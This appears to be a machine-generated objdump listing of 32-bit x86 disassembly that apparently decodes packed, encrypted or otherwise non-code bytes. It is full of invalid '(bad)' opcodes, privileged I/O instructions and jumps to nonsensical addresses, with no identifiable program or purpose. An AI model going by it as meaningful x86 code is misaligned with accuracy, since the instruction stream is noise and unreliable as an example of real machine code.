  41f796:	dec    eax
  41f797:	ins    DWORD PTR es:[edi],dx
  41f798:	jbe    0x41f7bc
  41f79a:	aad    0x55
  41f79c:	scas   eax,DWORD PTR es:[edi]
  41f79d:	inc    ebx
  41f79e:	xor    BYTE PTR [ebp+eiz*4-0x80],bh
  41f7a2:	cmp    esp,DWORD PTR [eax]
  41f7a4:	mov    cl,0xcf
  41f7a6:	jle    0x41f774
  41f7a8:	loop   0x41f7dc
  41f7aa:	lods   al,BYTE PTR ds:[esi]
  41f7ab:	fwait
  41f7ac:	(bad)  
  41f7ad:	mov    ebp,0x44b4ee90
  41f7b2:	pop    esi
  41f7b3:	ja     0x41f76f
  41f7b5:	(bad)  
  41f7b6:	fidivr WORD PTR [ecx+0x29]
  41f7b9:	xlat   BYTE PTR ds:[ebx]
  41f7ba:	in     al,dx
  41f7bb:	push   0xffffffa0
  41f7bd:	in     eax,dx
  41f7be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7bf:	pop    edx
  41f7c0:	or     eax,0xcaab7c09
  41f7c5:	data16 or dh,BYTE PTR [edi-0xf]
  41f7c9:	adc    ebx,DWORD PTR [edi+edi*4-0x16]
  41f7cd:	sub    DWORD PTR [edx-0x28cd82c0],esi
  41f7d3:	pushf  
  41f7d4:	icebp  
  41f7d5:	push   ebx
  41f7d6:	dec    ebx
  41f7d7:	pop    edx
  41f7d8:	pop    edi
  41f7d9:	stos   DWORD PTR es:[edi],eax
  41f7da:	arpl   si,ax
  41f7dc:	test   al,0xee
  41f7de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7df:	add    eax,0x8f558d02
  41f7e4:	xchg   ebx,eax
  41f7e5:	int3   
  41f7e6:	dec    ebp
  41f7e7:	mov    ebp,0xa1460809
  41f7ec:	mov    bl,0x7b
  41f7ee:	push   edi
  41f7ef:	jg     0x41f7af
  41f7f1:	mov    esi,0xa153d673
  41f7f6:	adc    eax,0xc0e4f9f5
  41f7fb:	fcmovnb st,st(2)
  41f7fd:	push   ds
  41f7fe:	ds retf 0x4d07
  41f802:	stc    
  41f803:	mov    edx,0xde45b004
  41f808:	sbb    DWORD PTR [ecx],edi
  41f80a:	adc    ebx,eax
  41f80c:	loopne 0x41f7c4
  41f80e:	and    al,BYTE PTR [esi]
  41f810:	adc    dh,BYTE PTR [ebx]
  41f812:	and    al,0x46
  41f814:	xchg   ebx,eax
  41f815:	ja     0x41f85d
  41f817:	mov    bh,0xa6
  41f819:	ins    BYTE PTR es:[edi],dx
  41f81a:	inc    ebx
  41f81b:	xchg   edx,eax
  41f81c:	fnstsw WORD PTR [ecx+0x52]
  41f81f:	sbb    al,0x14
  41f821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f822:	sub    al,0x4e
  41f824:	jo     0x41f7da
  41f826:	push   esp
  41f827:	jle    0x41f895
  41f829:	icebp  
  41f82a:	push   eax
  41f82b:	ror    DWORD PTR [edi-0x31],cl
  41f82e:	jl     0x41f873
  41f830:	lds    ebp,FWORD PTR ds:0x220afc32
  41f836:	je     0x41f884
  41f838:	or     eax,DWORD PTR [ecx]
  41f83a:	bound  esp,QWORD PTR [esi+eax*8+0x37b6e4a]
  41f841:	test   al,0x34
  41f843:	mov    bl,0x31
  41f845:	jg     0x41f7c8
  41f847:	(bad)  
  41f848:	pop    ecx
  41f849:	xor    al,0x1e
  41f84b:	inc    ecx
  41f84c:	xor    ecx,DWORD PTR ds:0xc5cfe450
  41f852:	in     eax,0x9e
  41f854:	ret    
  41f855:	lea    ecx,[esp+ebx*8]
  41f858:	pop    esi
  41f859:	inc    ecx
  41f85a:	shl    esp,cl
  41f85c:	mov    ecx,0xd19343fe
  41f861:	aaa    
  41f862:	mov    DWORD PTR [eax],eax
  41f864:	ds mov esi,0x7d6bbf5e
  41f86a:	inc    ebx
  41f86b:	pop    ss
  41f86c:	push   esi
  41f86d:	sbb    ebp,DWORD PTR [ecx]
  41f86f:	push   cs
  41f870:	xor    al,cl
  41f872:	adc    eax,0x307652e6
  41f877:	jle    0x41f838
  41f879:	ftst   
  41f87b:	mov    DWORD PTR [ebp+0x58ae9b96],esi
  41f881:	imul   DWORD PTR [ebp+0xf]
  41f884:	lods   eax,DWORD PTR ds:[esi]
  41f885:	pusha  
  41f886:	lods   eax,DWORD PTR ds:[esi]
  41f887:	adc    eax,0x238b34a2
  41f88c:	test   al,0x69
  41f88e:	test   DWORD PTR [esi+edi*2],ebx
  41f891:	test   DWORD PTR [edi+0x5614766c],ebx
  41f897:	cmp    al,0xcb
  41f899:	fwait
  41f89a:	in     al,0xc0
  41f89c:	ret    
  41f89d:	pop    ss
  41f89e:	mov    DWORD PTR [ecx+0xf676987],ebx
  41f8a4:	test   DWORD PTR [eax+esi*2-0x66],eax
  41f8a8:	and    ah,BYTE PTR [eax-0xa]
  41f8ab:	jnp    0x41f8fd
  41f8ad:	clc    
  41f8ae:	xchg   edi,eax
  41f8af:	dec    ebp
  41f8b0:	jae    0x41f88c
  41f8b2:	mov    ds:0x934bf799,eax
  41f8b7:	mov    ecx,0x145e956d
  41f8bc:	leave  
  41f8bd:	in     al,0xad
  41f8bf:	xor    BYTE PTR [eax+ecx*8],0xb2
  41f8c3:	not    ecx
  41f8c5:	ins    DWORD PTR es:[edi],dx
  41f8c6:	daa    
  41f8c7:	jp     0x41f882
  41f8c9:	loopne 0x41f8ee
  41f8cb:	inc    esi
  41f8cc:	test   eax,0xd581684f
  41f8d1:	in     eax,0xc3
  41f8d3:	mov    ebp,0x35561236
  41f8d8:	or     al,0xf1
  41f8da:	jge    0x41f88c
  41f8dc:	fiadd  DWORD PTR [ebp+edx*1+0x6f]
  41f8e0:	push   0xe51c37b6
  41f8e5:	rol    cl,cl
  41f8e7:	retfw  0xb647
  41f8eb:	call   0x44881889
  41f8f0:	in     al,dx
  41f8f1:	in     al,dx
  41f8f2:	adc    ebp,edi
  41f8f4:	sbb    al,0xbf
  41f8f6:	mov    ebx,0x9acd52d7
  41f8fb:	or     eax,0x13bd0232
  41f900:	(bad)  
  41f901:	mov    ebx,0x56cfb765
  41f906:	pop    ds
  41f907:	push   cs
  41f908:	jno    0x41f958
  41f90a:	or     cl,BYTE PTR ds:0xd92ae95e
  41f910:	aaa    
  41f911:	jle    0x41f913
  41f913:	mov    esp,0xb61a5ad
  41f918:	popa   
  41f919:	test   BYTE PTR ds:0xf6e2d775,al
  41f91f:	pop    ebx
  41f920:	jns    0x41f90e
  41f922:	push   edi
  41f923:	icebp  
  41f924:	mov    ds:0x56bfa804,eax
  41f929:	repnz inc eax
  41f92b:	ret    0xb485
  41f92e:	pop    ebx
  41f92f:	and    ebx,eax
  41f931:	pop    eax
  41f932:	stc    
  41f933:	dec    edx
  41f934:	jb     0x41f907
  41f936:	shl    DWORD PTR ds:0x1b4994a1,cl
  41f93c:	bound  ebp,QWORD PTR [eax+0x55f9789b]
  41f942:	rol    DWORD PTR [ecx+0x49ad7f33],cl
  41f948:	inc    edi
  41f949:	adc    BYTE PTR [ebx-0x6bcd59fb],bh
  41f94f:	xor    eax,0xf237fbd0
  41f954:	hlt    
  41f955:	dec    ebx
  41f956:	mov    edx,0x23cc137d
  41f95b:	xor    edi,DWORD PTR [esi+0x3b1e30d7]
  41f961:	jnp    0x41f902
  41f963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f964:	sub    al,0xcd
  41f966:	pop    ecx
  41f967:	mov    al,ds:0x7e7c5faf
  41f96c:	pop    ecx
  41f96d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f96e:	cmp    DWORD PTR [ecx],edx
  41f970:	popf   
  41f971:	scas   eax,DWORD PTR es:[edi]
  41f972:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f973:	adc    DWORD PTR ds:0xcd16f6ff,ebp
  41f979:	lods   eax,DWORD PTR ds:[esi]
  41f97a:	pushf  
  41f97b:	not    BYTE PTR [ecx+ecx*2]
  41f97e:	mov    ebp,0xe6fe5986
  41f983:	jmp    0xc07f:0x2c5d7e2e
  41f98a:	in     al,0xd6
  41f98c:	jns    0x41f933
  41f98e:	jmp    FWORD PTR [edi]
  41f990:	sub    BYTE PTR [ebx-0x78ef72ad],bh
  41f996:	push   es
  41f997:	ins    BYTE PTR es:[edi],dx
  41f998:	or     eax,0xd3ddb465
  41f99d:	scas   al,BYTE PTR es:[edi]
  41f99e:	adc    eax,0xb7ede638
  41f9a3:	scas   eax,DWORD PTR es:[edi]
  41f9a4:	cld    
  41f9a5:	stc    
  41f9a6:	push   0x473d6aff
  41f9ab:	sub    bh,BYTE PTR [eax+0x7a9be897]
  41f9b1:	adc    edi,ecx
  41f9b3:	push   es
  41f9b4:	in     al,dx
  41f9b5:	jne    0x41f9e9
  41f9b7:	cld    
  41f9b8:	xor    esp,DWORD PTR [ebx+0x30]
  41f9bb:	data16 jae 0x41f9cf
  41f9be:	mov    eax,ds:0xc67e5c3e
  41f9c3:	pop    ecx
  41f9c4:	outs   dx,BYTE PTR ds:[esi]
  41f9c5:	and    DWORD PTR [ebp+0x62],esi
  41f9c8:	add    eax,esi
  41f9ca:	mov    ebp,0x7e7403ac
  41f9cf:	ds daa 
  41f9d1:	jg     0x41f993
  41f9d3:	lds    edi,FWORD PTR [ebx]
  41f9d5:	es mov ebx,eax
  41f9d8:	dec    eax
  41f9d9:	dec    esi
  41f9da:	jb     0x41f99e
  41f9dc:	cmp    edx,DWORD PTR [eax+0x13]
  41f9df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9e0:	jge    0x41f9aa
  41f9e2:	inc    ebx
  41f9e3:	pop    edi
  41f9e4:	push   cs
  41f9e5:	adc    bh,ah
  41f9e7:	mov    esi,0xb04406a5
  41f9ec:	mov    esi,0x9abe163e
  41f9f1:	jp     0x41f9a1
  41f9f3:	mov    edi,DWORD PTR [ecx+ebp*8]
  41f9f6:	outs   dx,BYTE PTR ds:[esi]
  41f9f7:	test   al,0xb1
  41f9f9:	popf   
  41f9fa:	jns    0x41fa08
  41f9fc:	mov    edi,DWORD PTR [edx-0x55f77e1c]
  41fa02:	adc    al,0x97
  41fa04:	mov    al,0xf2
  41fa06:	inc    esp
  41fa07:	add    ebx,edi
  41fa09:	shl    DWORD PTR [esi],0xee
  41fa0c:	mov    dh,0x47
  41fa0e:	ret    
  41fa0f:	inc    ebp
  41fa10:	inc    ebp
  41fa11:	mov    edi,0x282197dc
  41fa16:	not    BYTE PTR [edx]
  41fa18:	add    eax,0x4582a46a
  41fa1d:	aad    0x1c
  41fa1f:	xchg   esi,eax
  41fa20:	xchg   DWORD PTR [esi],ecx
  41fa22:	jmp    0xe5f5d5c4
  41fa27:	xchg   esi,eax
  41fa28:	ret    0x5c59
  41fa2b:	sub    cl,0x93
  41fa2e:	div    BYTE PTR [ebp-0x2e]
  41fa31:	adc    bh,ah
  41fa33:	ins    DWORD PTR es:[edi],dx
  41fa34:	xchg   ecx,eax
  41fa35:	retf   
  41fa36:	push   esp
  41fa37:	or     eax,0x8b7a88ad
  41fa3c:	ds (bad) 
  41fa3e:	dec    esi
  41fa3f:	jecxz  0x41fa9a
  41fa41:	mov    esp,0x8cefbc85
  41fa46:	(bad)  
  41fa47:	jnp    0x41fa15
  41fa49:	sub    BYTE PTR [edx+0x29c9cf3d],dl
  41fa4f:	mov    eax,ds:0x5d390e7d
  41fa54:	mov    eax,ds:0x1edb2cb2
  41fa59:	lea    esi,fs:[esi+esi*4]
  41fa5d:	(bad)
  41fa60:	push   ss
  41fa61:	dec    ebp
  41fa62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa63:	jne    0x41fab1
  41fa65:	test   eax,0x95ee449c
  41fa6a:	into   
  41fa6b:	dec    edi
  41fa6c:	hlt    
  41fa6d:	loope  0x41fac2
  41fa6f:	outs   dx,DWORD PTR gs:[esi]
  41fa71:	xor    eax,0x4bde08d5
  41fa76:	fdiv   DWORD PTR gs:[edx+0x34a02d65]
  41fa7d:	mov    ebp,DWORD PTR [edx]
  41fa7f:	dec    esi
  41fa80:	mov    eax,ds:0xe8029736
  41fa85:	aad    0xbb
  41fa87:	jmp    0x6a53868f
  41fa8c:	mov    dh,BYTE PTR [ebx]
  41fa8e:	push   esp
  41fa8f:	sbb    ebx,esi
  41fa91:	dec    ecx
  41fa92:	das    
  41fa93:	call   0xf7bd:0x25028761
  41fa9a:	repz repz int 0xe9
  41fa9e:	push   edx
  41fa9f:	or     eax,0x235c1562
  41faa4:	adc    al,0x98
  41faa6:	jg     0x41fac2
  41faa8:	into   
  41faa9:	rcr    DWORD PTR [eax-0x773c915e],1
  41faaf:	mov    bh,0x41
  41fab1:	(bad)  
  41fab2:	jnp    0x41fa4f
  41fab4:	les    esp,FWORD PTR [ecx]
  41fab6:	nop
  41fab7:	mov    ecx,0x4571444b
  41fabc:	xor    ecx,DWORD PTR [ecx+0x2a]
  41fabf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fac0:	pop    ds
  41fac1:	aad    0x43
  41fac3:	inc    edx
  41fac4:	mov    ebp,0x6fd987ae
  41fac9:	loop   0x41fa84
  41facb:	lahf   
  41facc:	es mov eax,0x54968724
  41fad2:	in     eax,dx
  41fad3:	rol    BYTE PTR [ecx-0x406d17aa],cl
  41fad9:	mov    cl,0xd8
  41fadb:	dec    esp
  41fadc:	hlt    
  41fadd:	jmp    0x15dfc097
  41fae2:	jno    0x41fb17
  41fae4:	cs cmc 
  41fae6:	shr    BYTE PTR [eax+0x7c],0xdf
  41faea:	lods   eax,DWORD PTR ds:[esi]
  41faeb:	add    eax,0x449a0c10
  41faf0:	pop    ebx
  41faf1:	mov    dl,0x91
  41faf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faf4:	mov    eax,0x4dfd8fab
  41faf9:	out    dx,eax
  41fafa:	pop    edx
  41fafb:	test   BYTE PTR [ecx+0x425147b],0xc4
  41fb02:	out    dx,eax
  41fb03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb04:	out    dx,eax
  41fb05:	add    ebp,DWORD PTR [esi]
  41fb07:	mov    ds:0xa4c811e6,al
  41fb0c:	popf   
  41fb0d:	push   ds
  41fb0e:	iret   
  41fb0f:	jae    0x41fa94
  41fb11:	and    dh,dl
  41fb13:	xor    cl,0xf4
  41fb16:	icebp  
  41fb17:	mov    esi,0x895d9967
  41fb1c:	sar    cl,cl
  41fb1e:	int3   
  41fb1f:	jne    0x41fb07
  41fb21:	pusha  
  41fb22:	les    ebx,FWORD PTR [ebx-0x1834cb5e]
  41fb28:	je     0x41fb39
  41fb2a:	nop
  41fb2b:	xchg   edi,eax
  41fb2c:	push   ds
  41fb2d:	adc    bl,BYTE PTR [ecx-0x11c374a3]
  41fb33:	mov    BYTE PTR [eax],ch
  41fb35:	repz not DWORD PTR [ebp+0x58]
  41fb39:	lea    esp,ds:0xe353188e
  41fb3f:	lock pop esp
  41fb41:	cwde   
  41fb42:	lds    edx,FWORD PTR [edi]
  41fb44:	dec    edi
  41fb45:	dec    ecx
  41fb46:	dec    ecx
  41fb47:	int    0xbc
  41fb49:	in     eax,dx
  41fb4a:	xor    esp,0x85c7c4fa
  41fb50:	sar    dl,0xad
  41fb53:	xor    DWORD PTR [edi+0x21],0x803977b
  41fb5a:	imul   BYTE PTR [ebx-0x44e22cbc]
  41fb60:	add    BYTE PTR [edi+0x65],al
  41fb63:	idiv   BYTE PTR [ebx]
  41fb65:	cmp    esp,eax
  41fb67:	cs loopne 0x41fbd0
  41fb6a:	sub    dl,BYTE PTR [edi-0x78faba0e]
  41fb70:	ret    0x444a
  41fb73:	inc    esi
  41fb74:	mov    ebp,DWORD PTR [edi+0x1]
  41fb77:	dec    eax
  41fb78:	xchg   BYTE PTR [edx-0x4004739e],cl
  41fb7e:	out    0x5d,al
  41fb80:	jae    0x41fbf4
  41fb82:	fadd   QWORD PTR [ebx-0x5]
  41fb85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb86:	(bad)  
  41fb87:	loopne 0x41fb92
  41fb89:	xor    eax,0x8da695b4
  41fb8e:	jmp    0x16c6:0x59044ea7
  41fb95:	ja     0x41fbbf
  41fb97:	pop    eax
  41fb98:	out    dx,al
  41fb99:	xchg   edi,eax
  41fb9a:	adc    BYTE PTR [edx],al
  41fb9c:	shr    BYTE PTR [edx],cl
  41fb9e:	stos   DWORD PTR es:[edi],eax
  41fb9f:	or     BYTE PTR [esi-0x1c],dh
  41fba2:	lock (bad) 
  41fba5:	data16 mov dl,0xc5
  41fba8:	mov    dh,0x30
  41fbaa:	pop    ebp
  41fbab:	push   0xffffffe0
  41fbad:	iret   
  41fbae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbaf:	push   eax
  41fbb0:	cld    
  41fbb1:	ret    0x6e59
  41fbb4:	push   0xffffffe9
  41fbb6:	mov    ebp,0xa43cf677
  41fbbb:	(bad)  
  41fbbc:	xor    eax,0x81671132
  41fbc1:	dec    esp
  41fbc2:	fcom   st(4)
  41fbc4:	or     al,0xa
  41fbc6:	pop    edx
  41fbc7:	push   eax
  41fbc8:	(bad)
  41fbcc:	dec    eax
  41fbcd:	nop
  41fbce:	mov    dh,BYTE PTR [ebx]
  41fbd0:	adc    edi,esi
  41fbd2:	mov    ds:0xb6f4c0b9,al
  41fbd7:	mov    ds:0x17f25e79,eax
  41fbdc:	(bad)  
  41fbdd:	je     0x41fbe9
  41fbdf:	push   eax
  41fbe0:	into   
  41fbe1:	nop
  41fbe2:	jg     0x41fbfb
  41fbe4:	mov    edx,0xb8a701af
  41fbe9:	mov    al,ds:0x5fd6ac1b
  41fbee:	lods   eax,DWORD PTR ds:[esi]
  41fbef:	inc    ecx
  41fbf0:	jae    0x41fb84
  41fbf2:	call   0xbc1f900e
  41fbf7:	mov    DWORD PTR [esi-0x13],ebp
  41fbfa:	mov    ds:0x49cc638,al
  41fbff:	push   ss
  41fc00:	lods   eax,DWORD PTR ds:[esi]
  41fc01:	push   eax
  41fc02:	xchg   edi,eax
  41fc03:	inc    esi
  41fc04:	cmp    al,0x37
  41fc06:	(bad)  
  41fc07:	test   BYTE PTR [edi],dl
  41fc09:	leave  
  41fc0a:	sti    
  41fc0b:	std    
  41fc0c:	jb     0x41fc3a
  41fc0e:	and    BYTE PTR [ebx],bl
  41fc10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc11:	xchg   edx,eax
  41fc12:	mov    esi,0x30cf85a
  41fc17:	ja     0x41fc5f
  41fc19:	mov    ch,BYTE PTR [ebp-0x3d908cac]
  41fc1f:	or     al,0x11
  41fc21:	sti    
  41fc22:	pop    es
  41fc23:	adc    edi,edi
  41fc25:	push   ds
  41fc26:	mov    al,0x62
  41fc28:	(bad)  
  41fc2a:	and    eax,0xce9ac037
  41fc2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc30:	inc    eax
  41fc31:	inc    ebp
  41fc32:	push   esi
  41fc33:	scas   eax,DWORD PTR es:[edi]
  41fc34:	dec    ebx
  41fc35:	cmp    al,BYTE PTR [edx]
  41fc37:	and    al,0xc0
  41fc39:	lahf   
  41fc3a:	dec    esp
  41fc3b:	and    BYTE PTR [edx+0x409fff30],dl
  41fc41:	in     eax,0x47
  41fc43:	xchg   ecx,eax
  41fc44:	mov    ds:0x11b6c2d,eax
  41fc49:	lods   al,BYTE PTR ds:[esi]
  41fc4a:	es jbe 0x41fc1b
  41fc4d:	sub    BYTE PTR [eax],ah
  41fc4f:	push   ecx
  41fc50:	mov    esi,0xd832ca9e
  41fc55:	scas   al,BYTE PTR es:[edi]
  41fc56:	or     DWORD PTR [esi+0x3b779124],eax
  41fc5c:	mov    ecx,esi
  41fc5e:	mov    ecx,0x25b44caa
  41fc63:	fdiv   DWORD PTR [edi-0xd]
  41fc66:	jge    0x41fc33
  41fc68:	test   al,0x24
  41fc6a:	into   
  41fc6b:	sub    esi,DWORD PTR [edx]
  41fc6d:	ds pusha 
  41fc6f:	(bad)  
  41fc70:	jbe    0x41fc09
  41fc72:	push   0x69018a10
  41fc77:	dec    eax
  41fc78:	cmp    dl,al
  41fc7a:	or     ebx,ecx
  41fc7c:	fucom  st(1)
  41fc7e:	mov    esi,0xac52ba70
  41fc83:	mov    bl,cl
  41fc85:	data16 setae dl
  41fc89:	xor    ecx,edx
  41fc8b:	dec    eax
  41fc8c:	push   cs
  41fc8d:	call   0x455a:0x7be1407d
  41fc94:	test   eax,0x9bb7c5db
  41fc99:	sbb    al,BYTE PTR ds:[ebx-0x6ad8f43d]
  41fca0:	in     al,0x6b
  41fca2:	dec    ebp
  41fca3:	(bad)  
  41fca4:	mov    al,0x2f
  41fca6:	inc    eax
  41fca7:	and    eax,0xedb5e2cc
  41fcac:	(bad)  
  41fcad:	jno    0x41fc3e
  41fcaf:	jne    0x41fc67
  41fcb1:	mov    edx,0x6b2cff5a
  41fcb6:	gs dec esp
  41fcb8:	lahf   
  41fcb9:	ins    BYTE PTR es:[edi],dx
  41fcba:	and    cl,BYTE PTR [edi-0x5090b2d6]
  41fcc0:	pop    es
  41fcc1:	std    
  41fcc2:	jae    0x41fcfc
  41fcc4:	mov    bp,0x1700
  41fcc8:	inc    edi
  41fcc9:	sub    BYTE PTR [ecx],ah
  41fccb:	jl     0x41fd3d
  41fccd:	xchg   al,cl
  41fccf:	and    dl,BYTE PTR [ecx]
  41fcd1:	xchg   edx,eax
  41fcd2:	pop    ebx
  41fcd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcd4:	xor    BYTE PTR [edx+0xc784c98],ch
  41fcda:	stos   BYTE PTR es:[edi],al
  41fcdb:	std    
  41fcdc:	sbb    esp,DWORD PTR [esi]
  41fcde:	mov    bh,0xbb
  41fce0:	push   eax
  41fce1:	ins    DWORD PTR es:[edi],dx
  41fce2:	scas   eax,DWORD PTR es:[edi]
  41fce3:	inc    edi
  41fce4:	es push es
  41fce6:	or     al,0x40
  41fce8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fce9:	imul   eax,DWORD PTR ds:[ebp+0x31379c6f],0x33c53864
  41fcf4:	pop    es
  41fcf5:	cmp    ecx,DWORD PTR ds:0x973b8bc8
  41fcfb:	sub    ah,BYTE PTR ds:[ebp-0x6c1098bb]
  41fd02:	fwait
  41fd03:	or     dh,dl
  41fd05:	mov    bh,dl
  41fd07:	fisubr WORD PTR [ebp*1+0x5f7f45a1]
  41fd0e:	mov    ah,0x24
  41fd10:	(bad)  
  41fd11:	cmp    al,0x1a
  41fd13:	or     ebx,DWORD PTR [edi+0x33141f92]
  41fd19:	push   esi
  41fd1a:	push   ss
  41fd1b:	jmp    0xc7e5:0xfd7105a0
  41fd22:	sub    eax,0xa3079f99
  41fd27:	or     BYTE PTR [esi],al
  41fd29:	xchg   edx,eax
  41fd2a:	add    BYTE PTR [ebx+0x6f1a0a0a],al
  41fd30:	or     eax,0x249ecbff
  41fd35:	add    bl,BYTE PTR [esi]
  41fd37:	and    al,al
  41fd39:	stos   BYTE PTR es:[edi],al
  41fd3a:	cmp    bl,BYTE PTR ds:[eax+0x1c]
  41fd3e:	or     eax,0x654ee111
  41fd43:	sti    
  41fd44:	sbb    BYTE PTR [esi],dl
  41fd46:	add    al,0x82
  41fd48:	dec    eax
  41fd49:	in     eax,0xda
  41fd4b:	mov    ah,0xb0
  41fd4d:	or     BYTE PTR [ebx+0x1c],0x71
  41fd51:	mov    esi,0xd23568c3
  41fd56:	test   DWORD PTR [esi-0x39],eax
  41fd59:	mov    esp,0x618464bd
  41fd5e:	and    ebx,DWORD PTR [ebp+0x5c]
  41fd61:	xor    ah,bh
  41fd63:	push   es
  41fd64:	push   ebp
  41fd65:	cs jg  0x41fdbe
  41fd68:	xor    al,0x6f
  41fd6a:	rcl    DWORD PTR [eax],0xd3
  41fd6d:	outs   dx,DWORD PTR ds:[esi]
  41fd6e:	dec    esi
  41fd6f:	sub    edx,DWORD PTR [ebp-0x7b522af5]
  41fd75:	xchg   edx,eax
  41fd76:	push   ecx
  41fd77:	mov    al,0xe6
  41fd79:	mov    edi,0x867c47f0
  41fd7e:	jmp    0x4c4d9365
  41fd83:	jle    0x41fdf7
  41fd85:	loopne 0x41fdcf
  41fd87:	pop    ebx
  41fd88:	pop    ds
  41fd89:	sbb    BYTE PTR ds:0xa31fc6c0,ch
  41fd8f:	mov    ecx,0x258a7e52
  41fd94:	add    esi,DWORD PTR [esi]
  41fd96:	fwait
  41fd97:	test   DWORD PTR [eax],0xde68e5b5
  41fd9d:	or     eax,0xe883e2d5
  41fda2:	xchg   edi,eax
  41fda3:	dec    edx
  41fda4:	push   0x2b
  41fda6:	mov    cl,0xe6
  41fda8:	adc    DWORD PTR ds:0x4d07b5d1,esp
  41fdae:	jge    0x41fd36
  41fdb0:	retf   0x554c
  41fdb3:	arpl   WORD PTR ds:0x8e29eb8c,cx
  41fdb9:	scas   al,BYTE PTR es:[edi]
  41fdba:	jmp    0x75d2:0xf33b428a
  41fdc1:	push   ebx
  41fdc2:	pop    esp
  41fdc3:	jmp    0x41fd46
  41fdc5:	pop    eax
  41fdc6:	add    eax,0x733745bb
  41fdcb:	mov    ebx,0xfc0f14f8
  41fdd0:	push   edx
  41fdd1:	dec    edi
  41fdd2:	test   al,0xf4
  41fdd4:	cs ja  0x41fe0a
  41fdd7:	cmp    eax,0x16386def
  41fddc:	mov    WORD PTR [esi],es
  41fdde:	and    al,0x39
  41fde0:	dec    ebp
  41fde1:	cmp    esi,DWORD PTR [edx-0x46]
  41fde4:	daa    
  41fde5:	dec    esp
  41fde6:	mov    esp,0x4a2f58e2
  41fdeb:	bound  edi,QWORD PTR [ecx-0x42]
  41fdee:	je     0x41fdea
  41fdf0:	xor    al,0x7f
  41fdf2:	sub    eax,DWORD PTR ds:0x38b435d5
  41fdf8:	mov    esp,DWORD PTR [ebp-0x250b6400]
  41fdfe:	sar    bh,1
  41fe00:	mov    bl,0x5d
  41fe02:	and    eax,esi
  41fe04:	aad    0x98
  41fe06:	dec    ebp
  41fe07:	xchg   edx,eax
  41fe08:	repnz out 0x3,eax
  41fe0b:	mov    bh,0xbe
  41fe0d:	popf   
  41fe0e:	scas   eax,DWORD PTR es:[edi]
  41fe0f:	ja     0x41fdef
  41fe11:	aaa    
  41fe12:	cmc    
  41fe13:	popf   
  41fe14:	push   ebp
  41fe15:	pcmpeqd mm5,QWORD PTR [ebp-0x45]
  41fe19:	icebp  
  41fe1a:	jg     0x41fdce
  41fe1c:	and    al,0x3b
  41fe1e:	xor    al,0xb0
  41fe20:	nop
  41fe21:	cld    
  41fe22:	mov    eax,0x2a549195
  41fe27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe28:	jno    0x41fdae
  41fe2a:	aad    0xe9
  41fe2c:	iret   
  41fe2d:	leave  
  41fe2e:	dec    edx
  41fe2f:	adc    ch,BYTE PTR [eax+0x50]
  41fe32:	daa    
  41fe33:	(bad)  
  41fe34:	ficomp WORD PTR [ecx]
  41fe36:	adc    BYTE PTR [esi],bh
  41fe38:	push   edi
  41fe39:	ret    
  41fe3a:	cmp    eax,0x3932aef8
  41fe3f:	or     BYTE PTR [edi-0x23],ch
  41fe42:	mov    WORD PTR [ecx],?
  41fe44:	jns    0x41fe85
  41fe46:	jo     0x41fe14
  41fe48:	in     al,0xf1
  41fe4a:	adc    esi,ebp
  41fe4c:	rcr    ebx,cl
  41fe4e:	cmc    
  41fe4f:	aam    0x75
  41fe51:	icebp  
  41fe52:	inc    ebp
  41fe53:	std    
  41fe54:	test   eax,0x18407900
  41fe59:	cmc    
  41fe5a:	xor    DWORD PTR [ecx+ebx*2-0x3b],ebp
  41fe5e:	cwde   
  41fe5f:	xor    BYTE PTR [ebx-0x4],0x3f
  41fe63:	sub    al,0x43
  41fe65:	int    0x85
  41fe67:	fnsave [edi-0x7b]
  41fe6a:	fdiv   DWORD PTR [ebx+0x74]
  41fe6d:	shr    BYTE PTR [edx-0x70],0xaf
  41fe71:	fist   DWORD PTR [ecx]
  41fe73:	(bad)  
  41fe75:	dec    BYTE PTR [edi-0x6e936a3a]
  41fe7b:	inc    ebp
  41fe7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe7d:	inc    ebp
  41fe7e:	cmp    DWORD PTR [eax+0x6c],ebp
  41fe81:	fbstp  TBYTE PTR [edx-0x1754f76d]
  41fe87:	js     0x41fe14
  41fe89:	out    0xd3,al
  41fe8b:	cs sbb eax,0xb41a8956
  41fe91:	fldcw  WORD PTR [ecx-0x6db7025d]
  41fe97:	jae    0x41ff14
  41fe99:	mov    bh,0x6f
  41fe9b:	xor    DWORD PTR [edi],esi
  41fe9d:	fmul   QWORD PTR ds:0xa0fa4b50
  41fea3:	mov    esp,0xa57eef55
  41fea8:	sub    BYTE PTR [esi+0x35],0x68
  41feac:	addr16 addr16 and eax,0xe04459f7
  41feb3:	cmp    DWORD PTR [ecx-0x7b335adb],ebp
  41feb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41feba:	jge    0x41fe3f
  41febc:	push   ebx
  41febd:	loop   0x41fe6b
  41febf:	addr16 dec ebp
  41fec1:	das    
  41fec2:	mov    esp,0x92e007c6
  41fec7:	sub    dh,al
  41fec9:	add    eax,0x8f607fb6
  41fece:	dec    ebx
  41fecf:	xor    al,0xc1
  41fed1:	(bad)  
  41fed2:	xor    eax,0x8bbc0e18
  41fed7:	fiadd  WORD PTR [bx+si]
  41feda:	dec    ebx
  41fedb:	dec    ebp
  41fedc:	in     al,0x9c
  41fede:	jmp    DWORD PTR [edx+0x70775f30]
